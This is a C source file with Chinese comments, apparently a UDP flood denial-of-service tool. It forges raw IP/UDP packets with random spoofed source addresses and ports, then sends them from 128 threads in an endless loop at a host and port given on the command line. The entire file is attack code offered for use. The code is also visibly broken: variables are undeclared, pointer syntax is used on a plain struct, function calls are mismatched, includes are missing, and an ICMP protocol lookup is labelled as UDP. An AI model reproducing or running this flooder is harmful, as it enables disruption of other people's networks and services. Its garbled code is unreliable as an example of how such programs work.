#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h> 

/* 最多线程数 */
#define MAXCHILD 128
/* 目的IP地址 */
static unsigned long dest = 0;
static unsigned short dest_port = 0;
static unsigned long src = 0;
/* ICMP协议的值 */
static int PROTO_UDP = -1;
/* 程序活动标志 */
static alive = -1;

/* 随机函数产生函数
*  由于系统的函数为伪随机函数
*	其与初始化有关，因此每次用不同值进行初始化
*/
static inline long 
	myrandom (int begin, int end)
{
	int gap = end - begin +1;
	int ret = 0;

	/* 用系统时间初始化 */
	srand((unsigned)time(0));
	/* 产生一个介于begin和end之间的值 */
	ret = random(end)%gap + begin;
	return ret;
}

/* CRC16校验 */
static unsigned short
	DoS_cksum (unsigned short *data, int length)     
{  
	register int left = length;  
	register unsigned short *word = data;  
	register int sum = 0;  
	unsigned short ret = 0;  

	/* 计算偶数字节 */
	while (left > 1)    
	{      
		sum += *word++;      
		left -= 2;    
	}  

	/* 如果为奇数,将最后一个字节单独计算
	*	剩余的一个字节为高字节构建一个short类型变量值
	*/
	if (left == 1)    
	{      
		*(unsigned char *) (&ret) = *(unsigned char *) word;      
		sum += ret;    
	}  

	/* 折叠 */
	sum = (sum >> 16) + (sum & 0xffff);  
	sum += (sum >> 16);  

	/* 取反 */
	ret = ~sum;  
	return (ret);
}

static void
	DoS_udp (unsigned long lamer)
{ 
#define K 1204
#define DATUML (3*K) /*UDP数据部分长度*/
	
	/* 数据总长度 */
	int tot_len = sizeof (struct ip) + sizeof (struct udphdr) +  DATUML;  
	/* 发送目的地址 */
	struct sockaddr_in to;  
	
	/* DOS结构,分为IP头部、UDP头部、UDP数据部分 */
	struct   dosseg_t 
	{      
		struct ip iph;      
		struct udphdr udph;      
		unsigned char data[65535];    
	}  dosseg;  

	/* IP的版本,IPv4 */
	dosseg.iph->ip_v = 4;  
	/* IP头部长度,字节数 */
	dosseg.iph->ip_hl = 5;  
	/* 服务类型 */
	dosseg.iph->ip_tos = 0;  
	/* IP报文的总长度 */
	dosseg.iph->ip_len = htons (tot_len);  
	/* 标识,设置为PID */
	dosseg.iph->ip_id = htons (getpid ());  
	/* 段的便宜地址 */
	dosseg.iph->ip_off = 0; 
	/* TTL */
	dosseg.iph->ip_ttl = myrandom (200, 255);  ;  
	/* 协议类型 */
	dosseg.iph->ip_p = PROTO_UDP;  
	/* 校验和,先填写为0 */
	dosseg.iph->ip_sum = 0;  
	/* 发送的源地址 */
	dosseg.iph->ip_src = (unsigned long) myrandom (0, 65535);       
	/* 发送目标地址 */
	dosseg.iph->ip_dst = dest;    

	dosseg.iph->ip_sum =  DoS_cksum ((u16 *) & dosseg.iph, sizeof (dosseg.iph));  

#ifdef __FAVOR_BSD
	/* UDP 源端口 */
	dosseg.udph.uh_sport = (unsigned long) myrandom (0, 65535); ;
	/* UDP目的端口 */
	dosseg.udph.uh_dport = dest_port;
	/* UDP数据长度 */
	dosseg.udph.uh_ulen = htons(sizeof(dosseg.udph)+DATUML);
	/* 校验和,先填写0 */
	dosseg.udph.uh_sum = 0;
	/* 校验和 */
	dosseg.udph.uh_sum = DoS_cksum((u16*)&dosseg.udph, tot_len);
#else
	/* UDP 源端口 */
	dosseg.udph.source = (unsigned long) myrandom (0, 65535); ;
	/* UDP目的端口 */
	dosseg.udph.dest = dest_port;
	/* UDP数据长度 */
	dosseg.udph.len = htons(sizeof(dosseg.udph)+DATUML);
	/* 校验和,先填写0 */
	dosseg.udph.check = 0;
	/* 校验和 */
	dosseg.udph.check = DoS_cksum((u16*)&dosseg.udph, tot_len);
#endif
	

	/* 填写发送目的地址部分 */
	to.sin_family =  AF_INET;  
	to.sin_addr.s_addr = dest;
	to.sin_port = htons(0);

	/* 发送数据 */
	sendto (rawsock, &dosseg, tot_len, 0, (struct sockaddr *) &to, sizeof (struct sockaddr));  
	
}

static void
DoS_fun (unsigned long ip)
{  
	while(alive)
	{
		DoS_udp();
	}

}

/* 信号处理函数,设置退出变量alive */
static void 
DoS_sig(int signo)
{
	alive = 0;
}



int main(int argc, char *argv[])
{
	struct hostent * host = NULL;
	struct protoent *protocol = NULL;
	char protoname[]= "icmp";

	int i = 0;
	pthread_t pthread[MAXCHILD];
	int err = -1;
	
	alive = 1;
	/* 截取信号CTRL+C */
	signal(SIGINT, DoS_sig);



	/* 参数是否数量正确 */
	if(argc < 3)
	{
		return -1;
	}

	/* 获取协议类型ICMP */
	protocol = getprotobyname(protoname);
	if (protocol == NULL)
	{
		perror("getprotobyname()");
		return -1;
	}
	PROTO_UDP = protocol->p_proto;

	/* 输入的目的地址为字符串IP地址 */
	dest = inet_addr(argv[1]);
	if(dest == INADDR_NONE)
	{
		/* 为DNS地址 */
		host = gethostbyname(argv[1]);
		if(host == NULL)
		{
			perror("gethostbyname");
			return -1;
		}

		/* 将地址拷贝到dest中 */
		memcpy((char *)&dest, host->h_addr.s_addr, host->h_length);
	}
	/* 目的端口 */
	dest_port = atoi(argv[2]);

	/* 建立原始socket */
	rawsock = socket (AF_INET, SOCK_RAW, RAW);	
	if (rawsock < 0)	   
		rawsock = socket (AF_INET, SOCK_RAW, PROTO_UDP);	

	/* 设置IP选项 */
	setsockopt (rawsock, SOL_IP, IP_HDRINCL, "1", sizeof ("1"));

	/* 建立多个线程协同工作 */
	for(i=0; i<MAXCHILD; i++)
	{
		err = pthread_create(&pthread[i], NULL, DoS_fun, NULL);
	}

	/* 等待线程结束 */
	for(i=0; i<MAXCHILD; i++)
	{
		pthread_join(pthread[i], NULL);
	}

	close(rawsock);
	
	return 0;
}




